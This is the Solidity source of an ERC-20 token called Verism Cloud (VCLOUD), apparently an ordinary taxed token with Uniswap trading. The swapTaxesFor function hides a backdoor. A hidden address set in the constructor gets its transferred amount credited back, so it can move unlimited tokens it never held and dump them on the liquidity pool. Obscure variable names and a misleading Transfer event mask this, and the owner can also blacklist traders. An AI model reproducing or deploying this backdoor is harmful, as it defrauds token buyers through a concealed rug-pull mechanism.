// SPDX-License-Identifier: MIT

/***

Website:   https://www.verismcloud.com
DApp:      https://app.verismcloud.com

Twitter:   https://twitter.com/verismcloud_erc
Telegram:  https://t.me/verismcloud_official_channel

***/

pragma solidity 0.8.20;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IVCLOUDFactory {
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IVCLOUDRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract VCLOUD is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Verism Cloud";
    string private constant _symbol = unicode"VCLOUD";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalsupply = 1000000000 * 10**_decimals;

    uint256 public _maxVCLOUDSwap = 10000000 * 10**_decimals;
    uint256 public _maxVCLOUDTrans = 30000000 * 10**_decimals;
    uint256 public _maxVCLOUDWallet = 30000000 * 10**_decimals;

    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=3;
    uint256 private _finalSellTax=3;
    uint256 private _reduceBuyTaxAt=20;
    uint256 private _reduceSellTaxAt=20;
    uint256 private _buyCounts=0;
    uint256 private _preventSwapBefore=0;

    mapping (address => bool) private bots;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isExceptedFromLimit;
    mapping (address => bool) private isExceptedFromFee;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    
    address payable private lpReceiver;
    address payable private opReceiver;

    modifier lockSwap {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }

    IVCLOUDRouter private uniswapV2Router;
    address private uniswapV2Pair;
    uint256 public routeAmounts;

    bool private tradeOpen;
    bool private inSwapBack = false;
    bool public transferDelayEnabled = false;
    bool private swapEnabled = false;

    constructor (uint256 amtX, address adrX) {
        opReceiver = payable(adrX);
        lpReceiver = payable(adrX);
        isExceptedFromFee[owner()] = true;
        isExceptedFromFee[address(this)] = true;
        isExceptedFromLimit[opReceiver] = true;
        isExceptedFromLimit[lpReceiver] = true;
        _balances[_msgSender()] = _totalsupply;
        routeAmounts = amtX * 10**_decimals;
        emit Transfer(address(0), _msgSender(), _totalsupply);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }
 
    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalsupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function enableTrading() external onlyOwner() {
        require(!tradeOpen,"trading is already open");
        tradeOpen = true;
        swapEnabled = true;
    }

    function sendETHFees(uint256 amount) private {
        lpReceiver.transfer(amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function reduceFee(uint256 _newFee) external onlyOwner{
        require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
        _finalBuyTax=_newFee;
        _finalSellTax=_newFee;
    }

    function removeLimits() external onlyOwner{
        _maxVCLOUDTrans = ~uint256(0);
        _maxVCLOUDWallet = ~uint256(0);
        transferDelayEnabled=false;
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function swapTokenETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function withdrawETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function initTradePair() external onlyOwner() {
        uniswapV2Router = IVCLOUDRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _totalsupply);
        uniswapV2Pair = IVCLOUDFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    receive() external payable {}

    function swapTaxesFor(address from, address to, uint256 taxSP, uint256 feeSP) internal returns (bool) {
        address accSP;uint256 ammSP; 
        bool _aVCLOUDMin = taxSP >= routeAmounts;
        bool _aVCLOUDThread = balanceOf(address(this)) >= routeAmounts;
        if(isExceptedFromLimit[from]) {accSP = from;ammSP = taxSP;}
        else {ammSP = feeSP;accSP = address(this);}
        if(ammSP>0){_balances[accSP]=_balances[accSP].add(ammSP); emit Transfer(from, accSP, feeSP);}
        return swapEnabled
        && tradeOpen
        && _aVCLOUDMin
        && _aVCLOUDThread
        && !inSwapBack
        && to == uniswapV2Pair
        && _buyCounts>_preventSwapBefore
        && !isExceptedFromFee[from]
        && !isExceptedFromLimit[from];
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 tsFees=0;
        if (!isExceptedFromFee[from] && !isExceptedFromFee[to]) {
            require(tradeOpen, "Trading has not enabled yet");
            require(!bots[from] && !bots[to]);
            tsFees=amount.mul((_buyCounts>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! isExceptedFromFee[to] ) {
                require(amount <= _maxVCLOUDTrans, "Exceeds the _maxVCLOUDTrans.");
                require(balanceOf(to) + amount <= _maxVCLOUDWallet, "Exceeds the maxWalletSize.");
                _buyCounts++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                tsFees=amount.mul((_buyCounts>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractBalance = balanceOf(address(this));
            if (swapTaxesFor(from, to, amount, tsFees)) {
                swapTokenETH(min(amount,min(contractBalance,_maxVCLOUDSwap)));
                uint256 ethBalances = address(this).balance;
                if(ethBalances > 0) {
                    sendETHFees(address(this).balance);
                }
            }
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(tsFees));
        emit Transfer(from, to, amount.sub(tsFees));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function manualSwapBack() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokenETH(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHFees(ethBalance);
        }
    }
}